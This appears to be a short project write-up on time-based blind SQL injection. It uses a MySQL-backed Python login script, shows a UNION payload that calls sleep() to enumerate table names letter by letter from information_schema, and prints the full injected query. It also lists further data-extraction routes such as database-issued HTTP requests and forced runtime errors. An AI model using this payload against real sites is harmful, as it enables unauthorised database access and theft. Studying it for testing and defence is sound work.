# Timing Based SQL Injections
SQL Injections are funny little guys to play with! Even though prepared statements have fixed a lot of SQL injections, SQL injections are still well and alive in the wild!  
So, there are different situations where SQL Injections occur and different ways to get the information. With a search engine like item, the information might be directed to you, an error might occur, or something else on that matter. But, what if NOTHING happens? Boom, here's the solution: 

## SetUp
I used a MySQL database to do this project, but this would work on any database. The Python script is just a basic login script.
## Timing 
 Most people only know about MySQL's most basic function usage, but it has much, much more capabilities than we realize! It has if statements, procedures, functions... And a ton of other items that can be easily exploited in the long run. The one I choose to use was the sleep function. The query calls a sleep condition if it's able to find a table with the correct starting characters. If this is the case, then the function sleeps. Because the function sleeps, it's easy to depict what tables are in the database! Below is the injection used into the script for finding table names character by character: 
 
 ```  
 login("max","A \" UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like '"+ start_letter + char + "%' LIMIT 1) IS NOT null, sleep(0.05), 'false')
 ```
  ## Full Query:
 ``` 
    SELECT *
    FROM Login
    WHERE user = "max"
    AND password = "A " UNION select 1,if((SELECT table_name FROM information_schema.tables WHERE table_name like '"+ start_letter + char + "%' LIMIT 1) IS NOT null, sleep(0.05), 'false')" ;
 ```

## Future Work:
There are many other ways to get information out of a database without being able to see the physical information.  
Other routes: 
- Creating http requests to send information from the database.  
  - Only works on older systems. 
- Creating conditional runtimeerrors if a requirement is set.  
  - In the SELECT clause, using 1/0 can be useful. 
  - Returning a subquery that returning too many rows.
